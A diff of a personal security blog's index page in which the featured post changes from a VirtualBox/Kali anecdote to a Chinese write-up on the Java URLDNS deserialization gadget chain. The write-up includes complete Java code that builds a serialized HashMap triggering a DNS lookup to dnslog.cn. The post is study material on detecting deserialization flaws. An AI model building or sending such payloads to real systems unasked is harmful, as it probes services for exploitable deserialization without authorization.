@@ -139,7 +139,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -174,7 +174,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://ic3ma0.github.io/2025/04/11/Virtualbox_kali/">
+    <link itemprop="mainEntityOfPage" href="https://ic3ma0.github.io/2025/08/13/URLDNS%E9%93%BE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -192,7 +192,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/04/11/Virtualbox_kali/" class="post-title-link" itemprop="url">VirutalBox导入kali时遇到的坑点</a>
+          <a href="/2025/08/13/URLDNS%E9%93%BE/" class="post-title-link" itemprop="url">URLDNS链分析</a>
         </h2>
 
         <div class="post-meta-container">
@@ -202,15 +202,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2025-04-11 00:00:00" itemprop="dateCreated datePublished" datetime="2025-04-11T00:00:00+08:00">2025-04-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-08-13 00:53:47" itemprop="dateModified" datetime="2025-08-13T00:53:47+08:00">2025-08-13</time>
+      <time title="创建时间：2025-08-13 00:00:00 / 修改时间：00:34:28" itemprop="dateCreated datePublished" datetime="2025-08-13T00:00:00+08:00">2025-08-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -218,7 +212,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%9D%82%E7%B1%BB/" itemprop="url" rel="index"><span itemprop="name">杂类</span></a>
+          <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
         </span>
     </span>
 
@@ -232,20 +226,38 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>这件事情的经过起源于 我在今天尝试用VirtualBox来安装kali</p>
-<p>结果在按照官方的教程来导入时 遇到了一个奇怪的错误</p>
-<p><a target="_blank" rel="noopener" href="https://www.kali.org/docs/virtualization/import-premade-virtualbox/(%E5%AE%98%E6%96%B9%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B)">https://www.kali.org/docs/virtualization/import-premade-virtualbox/(官方安装教程)</a></p>
-<p>当我启动kali时 出现了这样的错误</p>
-<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250411151210.png" alt="图片"></p>
-<p>首先我找到了VirtualBox的解决方案</p>
-<p><a target="_blank" rel="noopener" href="https://forums.virtualbox.org/viewtopic.php?p=387186&sid=745e84b64bd83a3d035e02e41a17d615#p387186">https://forums.virtualbox.org/viewtopic.php?p=387186&amp;sid=745e84b64bd83a3d035e02e41a17d615#p387186</a></p>
-<p>提示我观察日志 <code>VBoxHardening.log</code> 可当我划到最下面的时候  最并没有解决方案中的那些中可能</p>
-<p>而是另一个错误代码  <strong>ExitCode&#x3D;0xc0000409</strong></p>
-<p>这令我很恼火 直到我找到了这个<a target="_blank" rel="noopener" href="https://blog.csdn.net/JaCenz/article/details/115827030">https://blog.csdn.net/JaCenz/article/details/115827030</a> 当我翻看评论区时</p>
-<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250411151206.png"></p>
-<p>？？？ 卸载完美世界 当我卸载后 尝试启动kali时 真的成功了 </p>
-<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250411150516.png" alt="图片"></p>
-<p>好吧 可以说这是我见过的最诡异的bug！！！</p>
+          <h2 id="URLDNS链-分析"><a href="#URLDNS链-分析" class="headerlink" title="URLDNS链-分析"></a>URLDNS链-分析</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>不需要依赖第三方的包 以及jdk的版本限制 所以通常用来检测反序列化的点</p>
+<h3 id="Gadget-Chain分析"><a href="#Gadget-Chain分析" class="headerlink" title="Gadget Chain分析"></a>Gadget Chain分析</h3><ul>
+<li>HashMap.readObject() 反序列化自动触发</li>
+<li>HashMap.putVal()</li>
+<li>HashMap.hash()</li>
+<li>URL.hashCode()</li>
+<li>URL.getHostAddress(u) 触发DNS请求</li>
+</ul>
+<p>分析下各个变量的赋值情况</p>
+<p>HashMap.readObject()中存在下列代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">               <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                   <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject(); </span><br><span class="line">               <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                   <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">               putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">  	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>key的值应该传为URL类对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">       <span class="type">int</span> h;</span><br><span class="line">       <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果key的值不为空 就调用key.hashCode()函数 继续往下走</p>
+<p>URL类实现了对hashCode()的重写 hasCode&#x3D;-1 则执行handler.hashCode()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续追踪该hashCode函数 其中getProtocol()触发了dns请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">protected int hashCode(URL u) &#123;</span><br><span class="line">    int h = 0;</span><br><span class="line"></span><br><span class="line">    // Generate the protocol part.</span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    if (protocol != null)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    // Generate the host part.</span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="构造恶意利用链思路"><a href="#构造恶意利用链思路" class="headerlink" title="构造恶意利用链思路"></a>构造恶意利用链思路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">首先需要new一个HashMap对象 在对该HashMap反序列化时 会自动执行readObject()函数 也就是入口点</span><br><span class="line">但是如何将URL类对象传入到HashMap对象中去</span><br><span class="line">找到HashMap的方法中的put方法</span><br><span class="line">    public V put(K key, V value) &#123;</span><br><span class="line">        return putVal(hash(key), key, value, false, true);</span><br><span class="line">    &#125;</span><br><span class="line">但注意这里会执行putVal()函数 直接去执行 而不是去执行我们readObject()中的putVal</span><br><span class="line">private int hashCode = -1;</span><br><span class="line">而hashCode的值默认为-1 也就是会触发一次DNS请求 在调用完 URL.hashCode()后 hashCode的值会随机为一个随机数 </span><br><span class="line">既然这样 当我们第二次去调用readObject里面的putVal()一直到调用URL.hashCode()时候 因为hashCode的值不为-1 因此 直接return</span><br><span class="line"></span><br><span class="line">所以在调用完put将URL类对象传递给value后，要讲URL类中的hashCode重新设置为-1</span><br><span class="line">如果为了更明显的验证漏洞存在 在调用put()方法前 要讲URL类的hashCode值设置不为-1 让其不触发DNS请求</span><br><span class="line"></span><br><span class="line">可以使用反射的方式去动态修改URL对象的hashCode值</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="完整代码实现"><a href="#完整代码实现" class="headerlink" title="完整代码实现"></a>完整代码实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class URLDNS &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        String dnsurl = &quot;http://dnslog.cn&quot;;</span><br><span class="line">        //url为hash()函数中的Object key</span><br><span class="line">        URL url = new URL(dnsurl);</span><br><span class="line">        //利用反射修改URL对象中的hashCode值</span><br><span class="line">        Class&lt;? extends URL&gt; aClass = url.getClass();</span><br><span class="line">        Field hashCode = aClass.getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        hashCode.setAccessible(true);</span><br><span class="line">        hashCode.set(url, 123);</span><br><span class="line">        //传入URL对象为value</span><br><span class="line">        hashMap.put(url,123);</span><br><span class="line">        hashCode.set(url,-1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //接下来将HashMap对象进行序列化和反序列化操作从而触发readObject()函数</span><br><span class="line">        try &#123;</span><br><span class="line">            FileOutputStream fileOutputStream = new FileOutputStream(&quot;./urldns.ser&quot;);</span><br><span class="line">            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);</span><br><span class="line">            outputStream.writeObject(hashMap);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            FileInputStream fileInputStream = new FileInputStream(&quot;./urldns.ser&quot;);</span><br><span class="line">            ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
 
       
     </div>
@@ -265,7 +277,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
